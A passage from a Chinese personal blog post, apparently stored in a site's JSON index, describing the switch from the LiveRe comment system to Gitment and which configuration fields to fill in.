用了来必力的评论系统，本地运行是正常的，但是传到服务器上就不行了，原因不明 2018/7/7更新去掉了来必力的评论系统，看了几个博客之后发现好像Gitment比较受欢迎，就换成了Gitment系统 需要注意的是gitment_client_id和gitment_client_secret 在注册之后就会给你了 gitment_owner:填自己github账号 gitment_repo: 存储评论的库，按理说这个也可以另外再建一个库，不过我为了以防万一就直接用博客的库了 这个评论系统好像可以汉化，懒得弄了 持续更新中~","categories":[{"name":"其他","slug":"其他","permalink":"https://perfect.xyz/categories/其他/"}],"tags":[]}]}